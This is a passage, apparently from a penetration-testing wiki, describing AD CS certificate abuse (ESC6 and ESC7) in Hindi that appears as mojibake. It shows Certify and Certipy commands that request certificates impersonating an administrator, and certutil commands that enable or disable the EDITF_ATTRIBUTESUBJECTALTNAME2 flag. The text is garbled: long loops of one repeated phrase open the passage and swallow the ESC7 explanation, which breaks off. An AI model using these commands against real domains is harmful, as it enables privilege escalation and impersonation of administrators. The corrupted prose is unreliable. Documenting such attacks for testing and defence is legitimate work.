рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд╕рдорд╛рд╡реЗрд╢рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдд
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
рдпрд╣ рдСрдкрд░реЗрд╢рди рдореБрдЦреНрдп рд░реВрдк рд╕реЗ **рджреВрд░рд╕реНрде рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдПрдХреНрд╕реЗрд╕** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рджреГрд╖реНрдЯрд┐рдХреЛрдг рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
Tools рдЬреИрд╕реЗ [**Certify**](https://github.com/GhostPack/Certify) рдФрд░ [**Certipy**](https://github.com/ly4k/Certipy) рдЗрд╕ рдЧрд▓рдд рд╡рд┐рдиреНрдпрд╛рд╕ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
рдЗрди рд╕реЗрдЯрд┐рдВрдЧреНрд╕ рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП, рдорд╛рдирд╛ рдЬрд╛рдП рдХрд┐ рдХрд┐рд╕реА рдХреЗ рдкрд╛рд╕ **рдбреЛрдореЗрди рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ** рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ рдпрд╛ рд╕рдордХрдХреНрд╖, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХреЛ рдХрд┐рд╕реА рднреА рдХрд╛рд░реНрдпрд╕реНрдерд▓ рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЛ рдЕрдкрдиреЗ рд╡рд╛рддрд╛рд╡рд░рдг рд╕реЗ рдЕрдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдзреНрд╡рдЬ рдХреЛ рд╣рдЯрд╛ рджрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
{% hint style="warning" %}
рдордИ 2022 рд╕реБрд░рдХреНрд╖рд╛ рдЕрдкрдбреЗрдЯ рдХреЗ рдмрд╛рдж, рдирдИ рдЬрд╛рд░реА рдХреА рдЧрдИ **рдкреНрд░рдорд╛рдгрдкрддреНрд░** рдореЗрдВ рдПрдХ **рд╕реБрд░рдХреНрд╖рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рд╢рд╛рдорд┐рд▓ рд╣реЛрдЧрд╛ рдЬреЛ **рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХреА `objectSid` рдЧреБрдгрд╡рддреНрддрд╛** рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдЧрд╛ред ESC1 рдХреЗ рд▓рд┐рдП, рдпрд╣ SID рдирд┐рд░реНрджрд┐рд╖реНрдЯ SAN рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, **ESC6** рдХреЗ рд▓рд┐рдП, SID **рдЕрдиреБрд░реЛрдзрдХрд░реНрддрд╛ рдХреА `objectSid`** рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдореНрдмрд┐рдд рдХрд░рддрд╛ рд╣реИ, SAN рдирд╣реАрдВред\
ESC6 рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, ESC10 (рдХрдордЬреЛрд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдореИрдкрд┐рдВрдЧ) рдХреЗ рд▓рд┐рдП рдкреНрд░рдгрд╛рд▓реА рдХреЛ ESC10 рдХреЗ рд▓рд┐рдП рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реЛрдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ, рдЬреЛ **рдирдП рд╕реБрд░рдХреНрд╖рд╛ рдПрдХреНрд╕рдЯреЗрдВрд╢рди** рдХреЗ рдКрдкрд░ **SAN рдХреЛ рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рджреЗрддрд╛ рд╣реИ**ред
{% endhint %}

## рд╡рдВрд╢рд╛рд╡рд▓реА рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдПрдХреНрд╕реЗрд╕ рдирд┐рдпрдВрддреНрд░рдг - ESC7
### рд╣рдорд▓рд╛ 1

#### рд╕реНрдкрд╖реНрдЯреАрдХрд░рдг

рд╕рд░реНрдЯрд┐рдлрд┐рдХреЗрдЯ рдкреНрд░рд╛рдзрд┐рдХрд░рдг рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реЗрд╕ рдирд┐рдпрдВрддреНрд░рдг рдХреЛ рд╕реАрдП рдХреНрд░рд┐рдпрд╛рдПрдБ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддреА рд╣реИрдВред рдпреЗ рдЕрдиреБрдорддрд┐рдпрд╛рдБ `certsrv.msc` рддрдХ рдкрд╣реБрдБрдЪрдХрд░ рджреЗрдЦреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдПрдХ рд╕реАрдП рдкрд░ рд░рд╛рдЗрдЯ-рдХреНрд▓рд┐рдХ рдХрд░рдХреЗ, рдЧреБрдгреЛрдВ рдХрд╛ рдЪрдпрди рдХрд░рдХреЗ, рдФрд░ рдлрд┐рд░ рд╕реБрд░рдХреНрд╖рд╛ рдЯреИрдм рдкрд░ рдЬрд╛рдХрд░ред рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдЕрдиреБрдорддрд┐рдпрд╛рдБ PSPKI рдореЙрдбреНрдпреВрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬреИрд╕реЗ рдХрдорд╛рдВрдб рдХреЗ рд╕рд╛рде рдЬрд╛рдВрдЪреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
рдпрд╣ рдореБрдЦреНрдп рдЕрдзрд┐рдХрд╛рд░реЛрдВ, рдЕрд░реНрдерд╛рдд **`ManageCA`** рдФрд░ **`ManageCertificates`**, рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рдЕрдВрджрд░ рдЕрдиреНрд╡рдп рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд░рдореБрдЦ рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ 